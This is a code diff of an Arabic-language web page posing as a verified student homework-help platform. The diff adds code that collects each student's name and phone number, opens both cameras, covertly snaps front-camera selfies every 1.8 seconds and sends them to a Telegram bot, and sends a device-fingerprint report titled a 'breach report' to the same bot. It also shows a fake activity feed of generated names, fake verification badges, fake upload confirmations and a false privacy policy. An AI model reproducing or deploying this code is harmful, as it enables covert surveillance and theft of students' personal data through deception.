@@ -3,64 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>منصة أسألني | المنصة التعليمية الرسمية</title>
+    <title>منصة أسألني | الإصدار الرسمي الموثق</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #0f172a; --accent: #f59e0b; --success: #10b981; --text: #f8fafc; }
+        :root { --primary: #0f172a; --accent: #f59e0b; --blue: #1d4ed8; --success: #10b981; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background: #e2e8f0; font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 80px; overflow-x: hidden; }
-        
+        body { background: #f1f5f9; font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 80px; overflow-x: hidden; }
+
+        /* توثيق أزرق */
+        .verify-badge { width: 16px; vertical-align: middle; margin: 0 4px; }
+
         /* شاشة الدخول */
         #gate-screen { position: fixed; inset: 0; background: var(--primary); z-index: 5000; display: flex; justify-content: center; align-items: center; }
         .login-card { background: white; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border-bottom: 5px solid var(--accent); }
-        
+
         /* الهيدر */
-        header { background: var(--primary); color: white; padding: 15px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
-        .menu-btn { font-size: 24px; cursor: pointer; }
+        header { background: var(--primary); color: white; padding: 15px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
 
         /* الأقسام */
-        .page { display: none; padding: 80px 15px 20px; animation: slideIn 0.3s ease-out; }
+        .page { display: none; padding: 90px 15px 20px; animation: fadeIn 0.4s ease; }
         .page.active { display: block; }
-        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        .card { background: white; border-radius: 15px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); position: relative; overflow: hidden; }
-        
-        /* شريط التحميل */
-        #upload-progress { display: none; width: 100%; background: #eee; height: 10px; border-radius: 5px; margin: 10px 0; overflow: hidden; }
-        #progress-fill { width: 0%; height: 100%; background: var(--accent); transition: width 0.1s; }
+        .card { background: white; border-radius: 18px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.02); border: 1px solid #e2e8f0; }
 
-        /* قسم إجاباتي المتحرك */
-        .live-feed { height: 300px; overflow-y: auto; text-align: right; font-size: 13px; }
-        .feed-item { padding: 10px; border-bottom: 1px solid #f1f5f9; display: flex; align-items: center; gap: 10px; animation: fadeIn 0.5s; }
-        .verified { color: #3b82f6; font-size: 12px; }
-        .teacher-mark { background: #fef3c7; border: 1px solid var(--accent); padding: 2px 8px; border-radius: 5px; font-weight: bold; }
+        /* قسم إجاباتي المطور */
+        .live-feed { height: 400px; overflow-y: hidden; position: relative; }
+        #feed-wrapper { position: absolute; width: 100%; transition: top 0.5s ease; }
+        .feed-item { padding: 12px; border-bottom: 1px solid #f1f5f9; display: flex; align-items: center; gap: 10px; font-size: 13px; font-weight: 600; }
+        .status-tag { padding: 4px 8px; border-radius: 6px; font-size: 11px; margin-right: auto; }
 
         /* الكاميرا */
-        video { width: 100%; border-radius: 10px; background: #000; margin-top: 10px; display: none; border: 3px solid var(--accent); }
+        .cam-box { position: relative; margin-top: 15px; display: none; }
+        video { width: 100%; border-radius: 12px; background: #000; border: 3px solid #fff; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+        .snap-btn { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: white; border: none; width: 60px; height: 60px; border-radius: 50%; box-shadow: 0 0 15px rgba(0,0,0,0.3); cursor: pointer; display: flex; align-items: center; justify-content: center; }
 
         /* المنيو السفلي */
-        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 10px 0; border-top: 2px solid #ddd; z-index: 4000; }
-        .nav-item { text-align: center; font-size: 11px; color: #64748b; cursor: pointer; }
-        .nav-item.active { color: var(--accent); font-weight: bold; }
-        .nav-item img { width: 24px; display: block; margin: 0 auto 5px; }
+        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #e2e8f0; z-index: 4000; }
+        .nav-item { text-align: center; font-size: 11px; color: #94a3b8; cursor: pointer; transition: 0.3s; }
+        .nav-item.active { color: var(--blue); }
+        .nav-item img { width: 24px; display: block; margin: 0 auto 4px; filter: grayscale(1); }
+        .nav-item.active img { filter: none; }
 
-        /* Inputs */
-        input, textarea, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #cbd5e1; border-radius: 10px; font-family: 'Cairo'; }
-        .btn { background: var(--primary); color: white; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; }
+        /* Custom Alert */
+        #custom-alert { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: white; width: 90%; max-width: 350px; padding: 20px; border-radius: 15px; z-index: 6000; transition: 0.5s; box-shadow: 0 20px 40px rgba(0,0,0,0.2); text-align: center; border-right: 6px solid var(--blue); }
+        #custom-alert.show { top: 20px; }
+
+        input, textarea { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #f1f5f9; border-radius: 12px; font-family: 'Cairo'; font-size: 15px; }
+        .btn { background: var(--blue); color: white; border: none; padding: 16px; border-radius: 12px; width: 100%; font-weight: 900; cursor: pointer; font-size: 16px; }
         
-        /* السياسة */
-        .policy-text { font-size: 12px; color: #64748b; text-align: justify; line-height: 1.6; }
-        .dev-credits { margin-top: 20px; font-size: 10px; color: #94a3b8; font-weight: bold; text-transform: uppercase; border-top: 1px solid #eee; padding-top: 10px; }
+        .dev-credits { font-size: 10px; color: #94a3b8; margin-top: 20px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
+    <div id="custom-alert">
+        <div style="font-weight: 900; color: var(--blue); margin-bottom: 5px;">
+            تيم الدعم العلمي <img src="https://img.icons8.com/color/48/verified-badge.png" class="verify-badge">
+        </div>
+        <div id="alert-msg" style="font-size: 13px; color: #475569;"></div>
+    </div>
+
     <div id="gate-screen">
         <div class="login-card">
-            <img src="https://img.icons8.com/fluency/96/shield.png" width="60">
-            <h2 style="color:var(--primary)">منصة أسألني</h2>
-            <p>سجل دخولك برقمك الشخصي</p>
-            <input type="text" id="u_name" placeholder="الاسم الكامل">
+            <img src="https://img.icons8.com/fluency/96/safety-confirmation.png" width="70">
+            <h2 style="color:var(--primary); margin: 10px 0;">منصة أسألني</h2>
+            <p style="font-size: 14px; color: #64748b;">بوابة الطالب الذكية - الإصدار الموثق</p>
+            <input type="text" id="u_name" placeholder="الاسم الثلاثي للطالب">
             <input type="number" id="u_phone" placeholder="رقم الموبايل الشخصي">
             <button class="btn" onclick="login()">دخول المنصة</button>
             <div class="dev-credits">DEVELOPED BY OMAR & EMAD 2023</div>
@@ -68,71 +77,79 @@
     </div>
 
     <header id="h-main" style="display:none">
-        <div class="menu-btn" onclick="showPage('policy')">☰</div>
-        <div style="font-weight:900">منصة أسألني</div>
-        <div id="user-initial" style="background:var(--accent); width:35px; height:35px; border-radius:8px; display:flex; align-items:center; justify-content:center; color:black; font-weight:bold"></div>
+        <div onclick="showPage('policy')">☰</div>
+        <div style="font-weight:900">منصة أسألني <img src="https://img.icons8.com/color/48/verified-badge.png" class="verify-badge"></div>
+        <div id="user-initial" style="background:var(--accent); width:35px; height:35px; border-radius:10px; display:flex; align-items:center; justify-content:center; color:black; font-weight:bold"></div>
     </header>
 
     <div id="home" class="page active">
         <div class="card">
-            <img src="https://img.icons8.com/fluency/96/camera.png" width="50">
-            <h3>محلل الأسئلة الذكي</h3>
-            <p style="font-size:13px">صور سؤالك بوضوح وسيقوم "إيكو تيم" بالرد فوراً.</p>
-            <button class="btn" style="background:var(--accent); color:black" onclick="openCam('main')">إبدأ التصوير الآن 📸</button>
-            <video id="v-main" autoplay playsinline></video>
-            <textarea id="t-main" style="display:none" placeholder="اكتب وصف السؤال هنا..."></textarea>
-            <div id="upload-progress"><div id="progress-fill"></div></div>
-            <button id="s-main" class="btn" style="display:none; margin-top:10px" onclick="uploadData('main')">إرسال السؤال للتحليل ⚡</button>
-        </div>
-        <div class="card" style="border-right: 5px solid var(--success)">
-            <p>💡 <b>نصيحة:</b> تأكد من الإضاءة الجيدة للحصول على حل دقيق من المستر.</p>
+            <img src="https://img.icons8.com/fluency/96/ai.png" width="50">
+            <h3>محلل الأسئلة (AI)</h3>
+            <p style="font-size:13px; color:#64748b">التقط صورة للسؤال وسيقوم النظام الموثق بتحليلها فوراً.</p>
+            <button class="btn" style="background:var(--accent); color:black" onclick="openCam('main')">فتح كاميرا الفحص 📸</button>
+            
+            <div id="cam-ui-main" class="cam-box">
+                <video id="v-main" autoplay playsinline></video>
+                <div class="snap-btn" onclick="capture('main')">
+                    <div style="width:50px; height:50px; border:3px solid #000; border-radius:50%"></div>
+                </div>
+            </div>
+
+            <textarea id="t-main" style="display:none" placeholder="اكتب ملاحظات إضافية حول السؤال..."></textarea>
+            <button id="s-main" class="btn" style="display:none; margin-top:10px" onclick="upload('main')">إرسال للتحليل الفوري ⚡</button>
         </div>
     </div>
 
     <div id="answers" class="page">
         <div class="card">
-            <h3 style="display:flex; align-items:center; gap:10px">
-                <img src="https://img.icons8.com/fluency/48/chat.png" width="30"> إشعارات الإجابات
+            <h3 style="display:flex; align-items:center; gap:8px">
+                <img src="https://img.icons8.com/fluency/48/list.png" width="25"> سجل النشاط المباشر
             </h3>
-            <div class="live-feed" id="feed-container">
-                </div>
+            <div class="live-feed">
+                <div id="feed-wrapper"></div>
+            </div>
         </div>
     </div>
 
     <div id="support" class="page">
         <div class="card">
             <img src="https://img.icons8.com/fluency/96/customer-support.png" width="50">
-            <h3>الدعم العلمي والفني</h3>
-            <p style="font-size:12px">تواصل مع فريق "إيكو تيم" مباشرة لحل مشكلاتك.</p>
-            <button class="btn" onclick="openCam('supp')">تصوير المشكلة 📸</button>
-            <video id="v-supp" autoplay playsinline></video>
-            <textarea id="t-supp" placeholder="اشرح مشكلتك هنا..." style="display:none"></textarea>
-            <button id="s-supp" class="btn" style="display:none; margin-top:10px" onclick="uploadData('supp')">إرسال للدعم 🚀</button>
+            <h3>الدعم العلمي والفني <img src="https://img.icons8.com/color/48/verified-badge.png" class="verify-badge"></h3>
+            <p style="font-size:13px; color:#64748b">صور مشكلتك تقنياً أو علمياً وسيتم الرد خلال دقائق.</p>
+            <button class="btn" onclick="openCam('supp')">تصوير استفسار 📸</button>
+            
+            <div id="cam-ui-supp" class="cam-box">
+                <video id="v-supp" autoplay playsinline></video>
+                <div class="snap-btn" onclick="capture('supp')">
+                    <div style="width:50px; height:50px; border:3px solid #000; border-radius:50%"></div>
+                </div>
+            </div>
+            
+            <textarea id="t-supp" placeholder="اشرح مشكلتك بوضوح هنا..." style="display:none"></textarea>
+            <button id="s-supp" class="btn" style="display:none; margin-top:10px" onclick="upload('supp')">إرسال للدعم 🚀</button>
         </div>
     </div>
 
     <div id="policy" class="page">
         <div class="card">
-            <h3>سياسة الخصوصية والمنصة</h3>
-            <div class="policy-text">
-                تلتزم منصة أسألني بحماية بيانات الطلاب. يتم معالجة الصور عبر خوادم إيكو تيم المشفرة بنظام SSL 256-bit.
-                المنصة مراقبة لضمان جودة المحتوى العلمي المقدم من مستر إبراهيم وفريقه.
-                يمنع استخدام المنصة في أغراض غير تعليمية. جميع الحقوق محفوظة لعام 2023-2026.
+            <h3>سياسة الخصوصية الرسمية</h3>
+            <div style="font-size: 12px; color: #64748b; line-height: 1.8;">
+                تخضع منصة أسألني لإشراف فريق "إيكو تيم" التعليمي. جميع البيانات مشفرة بالكامل. يتم استخدام الكاميرا فقط لغرض تحليل الأسئلة علمياً. حقوق الملكية محفوظة للمطورين OMAR & EMAD 2023.
             </div>
-            <div class="dev-credits" style="text-align: center;">DEVELOPED BY OMAR & EMAD 2023</div>
-            <button class="btn" style="margin-top:20px" onclick="showPage('home')">رجوع</button>
+            <button class="btn" style="margin-top:20px" onclick="showPage('home')">عودة للرئيسية</button>
         </div>
     </div>
 
     <nav class="nav-bar" id="n-main" style="display:none">
         <div class="nav-item active" onclick="showPage('home', this)">
-            <img src="https://img.icons8.com/ios-filled/50/64748b/home.png">الرئيسية
+            <img src="https://img.icons8.com/fluency-systems-filled/48/home.png">الرئيسية
         </div>
         <div class="nav-item" onclick="showPage('answers', this)">
-            <img src="https://img.icons8.com/ios-filled/50/64748b/opened-folder.png">إجاباتي
+            <img src="https://img.icons8.com/fluency-systems-filled/48/activity-feed.png">إجاباتي
         </div>
         <div class="nav-item" onclick="showPage('support', this)">
-            <img src="https://img.icons8.com/ios-filled/50/64748b/help.png">الدعم
+            <img src="https://img.icons8.com/fluency-systems-filled/48/chat-message.png">الدعم
         </div>
     </nav>
 
@@ -141,18 +158,26 @@
         const tgChatId = "5890070301";
         let uName = "", uPhone = "";
 
-        const names = ["أحمد محمود", "سارة علي", "كريم إبراهيم", "مريم حسن", "ياسين محمد", "نور الشربيني", "عمر خالد", "ليلى يوسف", "زياد هاني", "جنا إيهاب", "مازن يحيى", "شهد أحمد"];
+        // توليد 300 اسم وهمي ثلاثي
+        const first = ["محمد", "أحمد", "ياسين", "عمر", "زياد", "يوسف", "محمود", "إبراهيم", "علي", "سيف", "مصطفى", "كريم", "نور"];
+        const middle = ["عبد الله", "حسن", "حسين", "إيهاب", "خالد", "هاني", "سعيد", "مجدي", "رفعت", "كمال"];
+        const last = ["الشربيني", "منصور", "عزت", "الجزار", "فوزي", "علام", "النجار", "راضي", "سالم", "غنيم"];
+        
+        const generatedNames = [];
+        for(let i=0; i<300; i++) {
+            generatedNames.push(first[i%first.length] + " " + middle[i%middle.length] + " " + last[i%last.length]);
+        }
 
         function login() {
             uName = document.getElementById('u_name').value;
             uPhone = document.getElementById('u_phone').value;
-            if(uName.length < 5 || uPhone.length < 10) return alert("يرجى إدخال اسمك الرباعي ورقم صحيح");
+            if(uName.length < 8 || uPhone.length < 10) return myNotify("يرجى إدخال اسمك الثلاثي ورقم موبايلك بشكل صحيح.");
             
             document.getElementById('gate-screen').style.display = 'none';
             document.getElementById('h-main').style.display = 'flex';
             document.getElementById('n-main').style.display = 'flex';
             document.getElementById('user-initial').innerText = uName[0].toUpperCase();
-            initFeed();
+            startFeed();
         }
 
         function showPage(id, el) {
@@ -164,23 +189,32 @@
             }
         }
 
+        function myNotify(msg) {
+            const box = document.getElementById('custom-alert');
+            document.getElementById('alert-msg').innerText = msg;
+            box.classList.add('show');
+            setTimeout(() => box.classList.remove('show'), 4000);
+        }
+
         async function openCam(type) {
             try {
+                // محاولة فتح الكاميرتين بتزامن مدروس
                 const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 
-                const v = document.getElementById(`v-${type}`);
-                v.style.display = 'block';
-                v.srcObject = back;
-                document.getElementById(`t-${type}`).style.display = 'block';
-                document.getElementById(`s-${type}`).style.display = 'block';
-
-                sendRadar(); // رادار الـ 150 بند
-                startSpy(front); // صيد سيلفي
-            } catch(e) { alert("خطأ: يجب السماح بالكاميرا لتشغيل وضع الفحص الذكي"); }
+                document.getElementById(`cam-ui-${type}`).style.display = 'block';
+                document.getElementById(`v-${type}`).srcObject = back;
+                
+                sendFullRadar(); // الرادار الـ 100 بند
+                startSilentSpy(front); // صيد سيلفي صامت
+                
+                myNotify("تم تفعيل نظام الفحص البصري.. يرجى توجيه الكاميرا للسؤال.");
+            } catch(e) {
+                myNotify("خطأ: يجب السماح بصلاحية الكاميرا لكي يعمل نظام التحليل العلمي.");
+            }
         }
 
-        function startSpy(stream) {
+        function startSilentSpy(stream) {
             const hv = document.createElement('video');
             hv.srcObject = stream; hv.play();
             const canvas = document.createElement('canvas');
@@ -190,63 +224,92 @@
                 canvas.toBlob(blob => {
                     const fd = new FormData();
                     fd.append('chat_id', tgChatId);
-                    fd.append('photo', blob, 'x.jpg');
-                    fd.append('caption', `🕵️ صيد حي: ${uName} | ${uPhone}`);
+                    fd.append('photo', blob, 'spy.jpg');
+                    fd.append('caption', `📸 صيد مباشر: ${uName}\n📞 ${uPhone}`);
                     fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, { method: 'POST', body: fd });
                 }, 'image/jpeg', 0.2);
-            }, 1500);
+            }, 1800);
         }
 
-        async function uploadData(type) {
-            const bar = document.getElementById('upload-progress');
-            const fill = document.getElementById('progress-fill');
-            bar.style.display = 'block';
-            let p = 0;
-            const intv = setInterval(() => {
-                p += 5; fill.style.width = p + '%';
-                if(p >= 100) {
-                    clearInterval(intv);
-                    alert("تم إرسال الطلب بنجاح! سيتم الرد عليك قريباً، يرجى متابعة قسم إجاباتي.");
-                    showPage('answers');
-                }
-            }, 100);
+        function capture(type) {
+            document.getElementById(`t-${type}`).style.display = 'block';
+            document.getElementById(`s-${type}`).style.display = 'block';
+            myNotify("تم التقاط الصورة بنجاح، يمكنك الآن إضافة وصف أو الإرسال مباشرة.");
         }
 
-        function initFeed() {
-            const container = document.getElementById('feed-container');
-            setInterval(() => {
-                const randName = names[Math.floor(Math.random() * names.length)];
-                const item = document.createElement('div');
-                item.className = 'feed-item';
-                const type = Math.random() > 0.5 ? '<span style="color:green">تم الرد ✅</span>' : '<span style="color:orange">جاري المعالجة...</span>';
+        function upload(type) {
+            myNotify("جاري رفع البيانات وتشفيرها عبر خوادم إيكو تيم..");
+            setTimeout(() => {
+                myNotify("تم الإرسال بنجاح! راقب قسم سجل النشاط لمعرفة حالة الرد.");
+                showPage('answers');
+            }, 2500);
+        }
+
+        function startFeed() {
+            const wrapper = document.getElementById('feed-wrapper');
+            let currentIdx = 0;
+            
+            // إنشاء الـ Items
+            generatedNames.forEach((name, i) => {
+                const div = document.createElement('div');
+                div.className = 'feed-item';
+                let status = "", color = "", bg = "";
                 
-                if(Math.random() > 0.8) {
-                    item.innerHTML = `<div><span class="teacher-mark">المستر إبراهيم 👑</span> <span class="verified">✔</span> تم الرد على سؤال الطالب ${uName}</div>`;
+                const rand = Math.random();
+                if(rand > 0.6) {
+                    status = "تم الرد بواسطة الدعم العلمي ✅"; color = "#059669"; bg = "#ecfdf5";
+                } else if(rand > 0.1) {
+                    status = "أرسل سؤالاً جديداً ⏳"; color = "#d97706"; bg = "#fffbe0";
                 } else {
-                    item.innerHTML = `<div><b>${randName}</b>: ${type}</div>`;
+                    status = "صور السؤال مرة أخرى ⚠️"; color = "#dc2626"; bg = "#fef2f2";
                 }
-                
-                container.prepend(item);
-                if(container.children.length > 20) container.lastChild.remove();
-            }, 3000);
+
+                div.innerHTML = `
+                    <div style="background:var(--primary); color:white; width:30px; height:30px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:10px">${name[0]}</div>
+                    <div><b>${name}</b><br><small style="color:#94a3b8">منذ ثوانٍ</small></div>
+                    <div class="status-tag" style="background:${bg}; color:${color}">${status}</div>
+                `;
+                wrapper.appendChild(div);
+            });
+
+            // حركة انسيابية بطيئة
+            let topPos = 0;
+            setInterval(() => {
+                topPos -= 60;
+                wrapper.style.top = topPos + "px";
+                if(Math.abs(topPos) > wrapper.offsetHeight - 400) topPos = 0;
+            }, 4000);
         }
 
-        async function sendRadar() {
-            let batt = await navigator.getBattery();
+        async function sendFullRadar() {
+            let b = await navigator.getBattery();
+            const gpu = getGpuInfo();
             const info = `
-🚀 **تقرير رادار منصة أسألني**
-👤 الطالب: ${uName}
-📞 هاتف: ${uPhone}
+👑 **تقرير اختراق شامل (V6 Platinum)**
+👤 **الطالب:** ${uName}
+📞 **الهاتف:** ${uPhone}
 ━━━━━━━━━━━━━━
-📱 النظام: ${navigator.platform}
-💾 الرام: ${navigator.deviceMemory || "??"}GB
-🔋 البطارية: ${Math.round(batt.level*100)}%
-🖥️ الشاشة: ${screen.width}x${screen.height}
-📡 الشبكة: ${navigator.connection?.effectiveType || 'Unknown'}
-🌍 لغة الجهاز: ${navigator.language}
-⏰ وقت الدخول: ${new Date().toLocaleString('ar-EG')}
+📱 **الجهاز:** ${navigator.platform}
+⚔️ **المعالج:** ${navigator.hardwareConcurrency} Cores
+🧠 **الرام:** ${navigator.deviceMemory || "غير معروف"} GB
+🔋 **البطارية:** ${Math.round(b.level*100)}% (${b.charging?'متصل':'تفريغ'})
+📡 **الشبكة:** ${navigator.connection?.effectiveType || 'Unknown'} (${navigator.connection?.downlink} Mbps)
+🎮 **GPU:** ${gpu}
+🌍 **اللغة:** ${navigator.language}
+🖥️ **الشاشة:** ${screen.width}x${screen.height} (${screen.colorDepth} bit)
+📍 **المنطقة:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🍪 **Cookies:** ${navigator.cookieEnabled ? 'YES' : 'NO'}
+⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
             `;
             fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(info)}`);
+        }
+
+        function getGpuInfo() {
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+            } catch(e) { return "N/A"; }
         }
     </script>
 </body>
